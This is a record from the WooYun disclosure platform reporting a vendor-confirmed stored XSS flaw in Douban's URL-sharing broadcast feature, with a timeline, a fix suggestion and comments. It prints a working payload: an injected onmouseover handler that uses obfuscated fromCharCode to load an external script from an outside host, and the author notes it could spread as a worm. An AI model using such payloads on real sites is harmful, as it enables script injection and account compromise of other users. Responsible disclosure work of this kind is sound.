{"id": 19239, "wybug_id": "wooyun-2012-07440", "wybug_title": "豆瓣某处功能存储型XSS", "wybug_corp": "豆瓣", "wybug_author": "gainover", "wybug_date": "2012-05-23 14:41", "wybug_open_date": "2012-07-07 14:42", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "12", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["黑盒", "黑盒测试技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-05-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-05-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-06-02：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2012-06-12：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2012-06-22：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2012-07-07：\t细节向公众公开  简要描述： 豆瓣好像挺久没有出XSS了。 昨天逛乌云，温习了一下别人发的几个豆瓣的XSS，然后就登上俺的号，去测试一下。总体来说，该过滤的位置都过滤了，不过这处还是遗漏的！由于是内容发布性质的，可蠕虫。 详细说明：  漏洞页面：http://www.douban.com/update/ （友邻广播）漏洞原因：对url参数中双引号没有输入输出过滤测试步骤：1. 推荐网址功能，将url参数修改为：http://www.wooyun.org\" onmouseover=\"jQuery.getScript(String.fromCharCode(104,116,116,112,58,47,47,97,112,112,109,97,107,101,114,46,115,105,110,97,97,112,112,46,99,111,109,47,109,46,106,115))\" \"2. 把title内容写的很长很长 （这个主要是为了加大用户鼠标移到链接上的概率）---------------------------------------\n\n---------------------------------------3. 当其它用户查看友邻广播时， 鼠标只要移动到此有害链接上，就会触发XSS。4. 可加载外部JS，效果见【漏洞证明】   漏洞证明：  只要链接的文字足够长，鼠标碰到上面的中奖几率挺大的哦。 以下是调用外部JS效果：\n\n   修复方案：  这里应该是开发人员的疏忽所致，因为广播功能下的推荐图片什么的，测试了下，好像双引号都是过滤的。将url参数里的双引号（可能还有其它特殊字符）给过滤掉即可。   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2012-05-23 14:50 厂商回复： 谢谢反馈～ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-05-23 15:10 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @gainover 太给力了。    \n     2012-05-24 00:00 |    \t\t阿普 \t\t\t( 实习白帽子  |\t\t\t        Rank:36 漏洞数:3        | NFT小组成员)\t\t \n  还没遇到过这种XSS，    \n     2012-07-07 15:23 |    \t\tHxai11 \t\t\t( 普通白帽子  |\t\t\t        Rank:1137 漏洞数:218        | 于是我们奋力向前游，逆流而上的小舟，不停...)\t\t \n  求工具名称。。。    \n     2012-07-07 17:02 |    \t\txsser_w \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:33        | 哎)\t\t \n  上线前拿个扫描器扫下xss和csrf嘛...市面上扫描器那么多 随便改下    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}